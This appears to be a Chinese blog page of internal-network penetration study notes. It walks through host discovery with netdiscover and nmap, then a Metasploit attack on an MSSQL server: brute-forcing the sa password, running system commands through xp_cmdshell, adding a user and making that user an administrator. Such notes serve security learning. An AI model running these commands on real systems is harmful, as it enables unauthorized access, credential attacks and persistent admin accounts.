@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html>
+  <head><meta name="generator" content="Hexo 3.9.0">
+<meta name="google-site-verification" content="fQ_tfBgNjE9NQcpKnGAkWapHoKuimF5lVuNuqpPXar0">
+    <meta charset="utf-8">
+    
+    <title>内网渗透学习笔记 | Xiao Leung&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    
+      <link rel="icon" href="/favicon.png">
+    
+
+    <link rel="stylesheet" href="/css/style.css">
+
+    <link rel="stylesheet" href="/js/google-code-prettify/tomorrow-night-eighties.min.css">
+
+  </head>
+
+  <body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
+<header>
+
+	<a id="logo" href="/" title="Xiao Leung&#39;s Blog">
+	<img src="/favicon.png" alt="Xiao Leung&#39;s Blog"></a>
+	
+	
+		<!--搜索栏-->
+		<i class="js-toggle-search iconfont icon-search"></i>
+
+
+<form class="js-search search-form search-form--modal" method="get" action="http://gushi.li" role="search">
+	<div class="search-form__inner">
+		<div>
+			<i class="iconfont icon-search"></i>
+			<input class="text-input" placeholder="Enter Key..." type="search">
+		</div>
+	</div>
+</form>
+	
+
+	
+		<!--侧边导航栏-->
+		<a id="nav-toggle" href="#"><span></span></a>
+
+<nav>
+	<div class="menu-top-container">
+		<ul id="menu-top" class="menu">
+			
+				
+				<li class="current-menu-item">
+					<a href="https://www.plasf.cn/2019/08/01/HelloWorld/" target="_blank">AboutMe</a>
+				</li>
+			
+				
+				<li class="current-menu-item">
+					<a href="" target="_blank">友情链接</a>
+				</li>
+			
+				
+				<li class="current-menu-item">
+					<a href="https://www.redmango.top/" target="_blank">HhhM</a>
+				</li>
+			
+				
+				<li class="current-menu-item">
+					<a href="https://l1near.top/" target="_blank">L1nearのspace</a>
+				</li>
+			
+		</ul>
+	</div>
+</nav>
+	
+
+</header>
+
+<div class="m-header" id="headers" >
+	<section id="hero1" class="hero">
+		<div class="inner">
+		</div>
+	</section>
+	
+		<figure class="top-image" data-enable=true></figure>
+	
+</div>
+
+
+<!--文章列表-->
+<div class="wrapper">
+  
+    <!--文章-->
+<article>
+	
+  
+    <h1 class="post-title" itemprop="name">
+      内网渗透学习笔记
+    </h1>
+  
+
+	<div class='post-body mb'>
+		<p>本文将持续更新。系统记录内网渗透学习。</p>
+<p><strong><em>声明：本文仅研究学习所用，参考文章的一切活动均与本人无关。</em></strong></p>
+<h2 id="内网服务探测"><a href="#内网服务探测" class="headerlink" title="内网服务探测"></a>内网服务探测</h2><h3 id="Netdiscover-探测活动主机"><a href="#Netdiscover-探测活动主机" class="headerlink" title="Netdiscover 探测活动主机"></a>Netdiscover 探测活动主机</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><blockquote>
+<p>专用的二层发现工具。拥有主动和被动发现两种方式。</p>
+</blockquote>
+<h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>意义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-i 网卡</td>
+<td>指定监听的网卡</td>
+</tr>
+<tr>
+<td>-r range</td>
+<td>指定IP段</td>
+</tr>
+<tr>
+<td>-l filename</td>
+<td>从文件中读取IP段</td>
+</tr>
+<tr>
+<td>-p</td>
+<td>被动模式</td>
+</tr>
+<tr>
+<td>-t</td>
+<td>ARP发送间隔</td>
+</tr>
+<tr>
+<td>-c</td>
+<td>发包数量</td>
+</tr>
+</tbody></table>
+<h4 id="使用举例"><a href="#使用举例" class="headerlink" title="使用举例"></a>使用举例</h4><pre><code class="shell">netdiscover i eth0 -r 192.168.3.0/24 #主动探测IP：192.168.3.0/24段存活的主机
+netdiscover -p</code></pre>
+<h3 id="使用Namp探测主机开放服务"><a href="#使用Namp探测主机开放服务" class="headerlink" title="使用Namp探测主机开放服务"></a>使用Namp探测主机开放服务</h3><p>由于已经使用<code>netdiscover</code>探测指定主机的使用Pn参数跳过Pn检测。具体使用参数说明在另一篇文章里讲.</p>
+<pre><code class="shell">nmap -sV -Pn 192.168.3.31</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/blog/20200521142828.png" alt="20200521142828"></p>
+<h2 id="MSF攻击内网服务"><a href="#MSF攻击内网服务" class="headerlink" title="MSF攻击内网服务"></a>MSF攻击内网服务</h2><h3 id="MSF攻击内网Mssql数据库"><a href="#MSF攻击内网Mssql数据库" class="headerlink" title="MSF攻击内网Mssql数据库"></a>MSF攻击内网Mssql数据库</h3><h4 id="爆破Mssql弱口令"><a href="#爆破Mssql弱口令" class="headerlink" title="爆破Mssql弱口令"></a>爆破Mssql弱口令</h4><ul>
+<li>搜索mssql爆破payload</li>
+</ul>
+<pre><code>search mssql_login</code></pre><ul>
+<li>使用弱口令爆破payload</li>
+</ul>
+<pre><code class="shell">use auxiliary/scanner/mssql/mssql_login
+set rhosts 192.168.3.31
+run</code></pre>
+<ul>
+<li>如果提示:</li>
+</ul>
+<blockquote>
+<p>[*] Error: 192.168.109.139: Metasploit::Framework::LoginScanner::Invalid Cred details can’t be blank, Cred details can’t be blank (Metasploit::Framework::LoginScanner::MSSQL)</p>
+</blockquote>
+<p>则说明mssql不是默认密码需要指定字典进行爆破：</p>
+<pre><code class="shell">use auxiliary/scanner/mssql/mssql_login
+set rhosts 192.168.3.31
+set user_file /root/user.txt
+set pass_file /root/pass.txt
+run</code></pre>
+<ul>
+<li>爆破成功sa密码为admin<br><img src="http://goodcheerleung.gitee.io/blog/20200521143926.png" alt="20200521143926"></li>
+</ul>
+<h4 id="枚举Mssql配置信息"><a href="#枚举Mssql配置信息" class="headerlink" title="枚举Mssql配置信息"></a>枚举Mssql配置信息</h4><ul>
+<li>搜索枚举Mssql配置信息payload</li>
+</ul>
+<pre><code>search mssql_enum</code></pre><ul>
+<li>使用Mssql-enum payload</li>
+</ul>
+<pre><code class="shell">use auxiliary/admin/mssql_enum
+set username sa
+set password admin
+set rhosts 192.168.3.31
+run</code></pre>
+<ul>
+<li>这样可以看到mssql开放的哪些功能能够供我们利用，例如比较重要的就是xp_cmdshell能够直接继承mssql的权限执行系统命令：</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/blog/20200521145004.png" alt="20200521145004"></p>
+<h4 id="使用xp-cmdshell执行系统命令"><a href="#使用xp-cmdshell执行系统命令" class="headerlink" title="使用xp_cmdshell执行系统命令"></a>使用xp_cmdshell执行系统命令</h4><ul>
+<li>搜索mssql exec攻击脚本</li>
+</ul>
+<pre><code>search mssql_exec</code></pre><ul>
+<li>使用mssql_exec攻击脚本</li>
+</ul>
+<pre><code>use auxiliary/admin/mssql_exec
+set username sa
+set password admin
+set rhosts 192.168.3.31
+set cmd chcp 65001&amp;whoami
+run</code></pre><ul>
+<li>注意chcp 65001改变字符编码解决乱码问题，可以看到返回结果是system，直接添加新用户即可。</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/blog/20200521145639.png" alt="20200521145639"></p>
+<h5 id="增加用户"><a href="#增加用户" class="headerlink" title="增加用户"></a>增加用户</h5><pre><code class="shell">set cmd chcp 65001&amp;net user test abc!123456 /add
+run</code></pre>
+<h5 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h5><pre><code class="shell">set cmd chcp 65001&amp;net localgroup administrators test /add</code></pre>
+
+	</div>
+	<div class="meta split">
+		
+			<span>本文总阅读量 <span id="busuanzi_value_page_pv"></span> 次</span>
+		
+		<time class="post-date" datetime="2020-05-21T08:05:57.000Z" itemprop="datePublished">2020-05-21</time>
+	</div>
+</article>
+<!-- 目录内容 -->
+<div >
+
+    <p class="show-toc-btn" id="show-toc-btn" onclick="showToc();" style="display:none">
+          <span class="btn-bg"></span>
+          <span class="btn-text">文章导航</span>
+          </p>
+    <div id="toc-article" class="toc-article">
+        <span id="toc-close" class="toc-close" title="隐藏导航" onclick="showBtn();">×</span>
+        <strong class="toc-title">文章目录</strong>
+           <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#内网服务探测"><span class="toc-number">1.</span> <span class="toc-text">内网服务探测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Netdiscover-探测活动主机"><span class="toc-number">1.1.</span> <span class="toc-text">Netdiscover 探测活动主机</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#简介"><span class="toc-number">1.1.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#参数"><span class="toc-number">1.1.2.</span> <span class="toc-text">参数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用举例"><span class="toc-number">1.1.3.</span> <span class="toc-text">使用举例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用Namp探测主机开放服务"><span class="toc-number">1.2.</span> <span class="toc-text">使用Namp探测主机开放服务</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF攻击内网服务"><span class="toc-number">2.</span> <span class="toc-text">MSF攻击内网服务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF攻击内网Mssql数据库"><span class="toc-number">2.1.</span> <span class="toc-text">MSF攻击内网Mssql数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#爆破Mssql弱口令"><span class="toc-number">2.1.1.</span> <span class="toc-text">爆破Mssql弱口令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#枚举Mssql配置信息"><span class="toc-number">2.1.2.</span> <span class="toc-text">枚举Mssql配置信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用xp-cmdshell执行系统命令"><span class="toc-number">2.1.3.</span> <span class="toc-text">使用xp_cmdshell执行系统命令</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#增加用户"><span class="toc-number">2.1.3.1.</span> <span class="toc-text">增加用户</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#提升权限"><span class="toc-number">2.1.3.2.</span> <span class="toc-text">提升权限</span></a></li></ol></li></ol></li></ol></li></ol>
+         </div>
+   <script type="text/javascript">
+    function showToc(){
+        var toc_article = document.getElementById("toc-article");
+        var show_toc_btn = document.getElementById("show-toc-btn");
+        toc_article.setAttribrootute("style","display:block");
+        show_toc_btn.setAttribute("style","display:none");
+        };
+    function showBtn(){
+        var toc_article = document.getElementById("toc-article");
+        var show_toc_btn = document.getElementById("show-toc-btn");
+        toc_article.setAttribute("style","display:none");
+        show_toc_btn.setAttribute("style","display:block");
+        };
+	function getScrollTop() {
+	    var scroll_top = 0;
+	    if (document.documentElement && document.documentElement.scrollTop) {
+		scroll_top = document.documentElement.scrollTop;
+	    }
+	    else if (document.body) {
+		scroll_top = document.body.scrollTop;
+	    }
+	    return scroll_top;
+	};
+	var headers=document.getElementById("headers");
+	var tocs = document.getElementById("toc-article");
+	
+	
+	window.onscroll  = function(){
+	if(getScrollTop()>450){
+			if(tocs.offsetTop>100){
+			var tophight = tocs.offsetTop-15;
+			tocs.style.cssText="top:"+tophight+"px";
+			}
+	}else{
+			tocs.style.cssText="top:540px";
+		}
+				
+		
+		console.log(getScrollTop());	
+		
+	}
+   </script>
+      
+<!-- 目录内容结束 -->
+</div>
+
+<!--评论-->
+
+	
+<div id="lv-container" data-id="city" data-uid="MTAyMC80OTc4Mi8yNjI3Mw==">
+	<script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+	</script>
+<noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+</div>
+
+
+
+  
+</div>
+
+
+  <svg id="bigTriangleColor" width="100%" height="40" viewBox="0 0 100 102" preserveAspectRatio="none">
+    <path d="M0 0 L50 100 L100 0 Z"></path>
+  </svg>
+
+  
+
+
+  <div class="wrapper"></div>
+
+
+
+
+
+<div class="fat-footer">
+	<div class="wrapper">
+		<div class="layout layout--center">
+			<div class="layout__item palm-mb">
+				<div class="media">
+					<img class="headimg" src='/assets/blogImg/litten.png' alt='XiaoLeung'>
+					<div class="media__body">
+						<h4>兵至如归-Xiaoleung&#39;s Blog</h4>
+						<p class='site-description'>Don&#39;t forget why we started</p>
+					</div>
+				</div>
+				<div class="author-contact">
+					<ul>
+						
+							
+							<li>
+				        		<a href="https://github.com/sharpleung" target="_blank">
+				        			
+				        				<i class="iconfont icon-github"></i>
+				        			
+				        		</a>
+				        	</li>
+						
+							
+							<li>
+				        		<a href="https://www.plasf.cn/2019/08/01/HelloWorld/" target="_blank">
+				        			
+				        				<i class="iconfont icon-weixin"></i>
+				        			
+				        		</a>
+				        	</li>
+						
+					</ul>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+
+
+<footer class="footer" role="contentinfo">
+
+	<div class="wrapper wrapper--wide split split--responsive">
+<a href="http://beian.miit.gov.cn/">粤ICP备18132442号-1</a><br>
+<a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=44011202000643" style="display:inline-block;text-decoration:none;height:20px;line-height:20px;"><img src="/gongan.png" style="float:left;"/><p style="float:left;height:20px;line-height:20px;margin: 0px 0px 0px 5px; color:#939393;">粤公网安备 44011202000643号</p></a><br>
+
+		
+			<span>本站总访问量 <span id="busuanzi_value_site_pv"></span> 次, 访客数 <span id="busuanzi_value_site_uv"></span> 人次</span>
+		
+		<span>Theme by <a href="https://github.com/justpsvm">justpsvm</a>. Powered by <a href="https://hexo.io">Hexo</a></span>
+	</div>
+</footer>
+
+	<!-－这里导入了 lib.js 里面涵盖了 jQuery 等框架 所以注释掉-->
+	<!--<script src="http://lib.sinaapp.com/js/jquery/2.0/jquery.min.js"></script>-->
+	<script src="/js/lib.js"></script>
+	<script src="/js/google-code-prettify/prettify.js"></script>
+	<script src="/js/module.js"></script>
+	<script src="/js/script.js"></script>
+	
+		<script async src="http://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	
+	<script type='text/javascript'>
+		//代码高亮
+		$(document).ready(function(){
+	 		$('pre').addClass('prettyprint linenums').attr('style', 'overflow:auto;');
+   			prettyPrint();
+		});
+	</script>
+	<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+ <script type="text/javascript"> /* 鼠标点击特效 - 7Core.CN */ var a_idx = 0;jQuery(document).ready(function($) {$("body").click(function(e) {var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正" ,"法治", "爱国", "敬业", "诚信", "友善");var $i = $("<span/>").text(a[a_idx]); a_idx = (a_idx + 1) % a.length;var x = e.pageX,y = e.pageY;$i.css({"z-index": 100000000,"top": y - 20,"left": x,"position": "absolute","font-weight": "bold","color": "#ff6651"});$("body").append($i);$i.animate({"top": y - 180,"opacity": 0},1500,function() {$i.remove();});});}); </script>
+
